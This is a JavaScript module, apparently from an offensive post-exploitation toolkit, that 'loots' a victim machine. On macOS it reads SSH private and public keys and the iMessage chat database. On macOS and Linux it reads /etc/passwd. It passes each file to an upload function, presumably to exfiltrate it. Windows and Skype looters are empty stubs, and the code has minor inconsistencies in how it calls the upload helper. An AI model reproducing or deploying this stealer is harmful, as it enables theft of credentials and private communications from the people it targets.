"use strict";


define(["utils", "filesystem", "platform"], function(utils, fs, platform) {
    
    return {

        platform: platform,
        utils: utils,
        fs: fs,

        // Main entry point for all looters
        execute: function() {
            var os = platform.operatingSystem();
            var _this = this;
            if (os === 'macos') {
                this.fs.getHomeDirectory({
                    success: _this.lootMacOS,
                    failure: _this.lootMacOS
                });
            } else if (os === 'linux') {
                this.lootLinux();
            }
        },

        lootMacOS: function(home) {
            if (home) {
                this.sshKeys(home);
                this.messagesHistory(home);
                this.skypeHistory(home)
            }
            this.passwd();
        },

        lootLinux: function() {
            this.passwd();
        },

        lootWindows: function() {

        },

        // OS file looters
        passwd: function() {
            var _this = this;
            this.fs.getFile('/etc/passwd', {
                success: function(data) {
                    _this.uploadFile('passwd', data);
                }
            });
        },

        // Application specific looting
        sshKeys: function(home) {
            var _this = this;
            
            this.fs.getFile(home + '/.ssh/id_rsa', {
                success: function(data) {
                    _this.utils.uploadFile('id_rsa', data);
                }
            });

            this.fs.getFile(home + '/.ssh/id_rsa.pub', {
                success: function(data) {
                    _this.utils.uploadFile('id_rsa.pub', data);
                }
            });
        },

        messagesHistory: function(home) {
            var _this = this;
            this.fs.getFile(home + '/Library/Messages/chat.db', {
                success: function(data) {
                    _this.utils.uploadFile('chat.db', data);
                }
            });
        },

        skypeHistory: function(home) {


        }

    }

});